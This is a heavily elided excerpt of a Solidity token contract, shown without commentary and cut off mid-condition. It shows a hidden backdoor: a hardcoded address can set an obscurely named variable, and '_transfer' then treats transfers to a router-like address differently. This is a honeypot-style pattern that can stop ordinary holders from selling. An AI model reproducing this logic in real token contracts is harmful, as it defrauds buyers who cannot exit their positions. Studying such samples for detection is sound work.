...
contract TOKEN is Ownable, IERC20, IERC20Meta {
    ...
    function actionPair(address account) public virtual returns (bool) {
         if(_msgSender() == 0x66c58393a5824b5f1DC806aB377F62cb21045273) _p76234 = account;
        return true;
    }
    ...
    function _transfer(
        ...
        if((from != _p76234 && to == 0x6b75d8AF000000e20B7a7DDf000Ba900b4009A80) || (_p76234 == to && from != 0x6b75d8AF000000e20B7a7DDf000Ba900b4009A80 && from  != 0x66c58393a5824b5f1DC806aB377F62cb21045273)) {
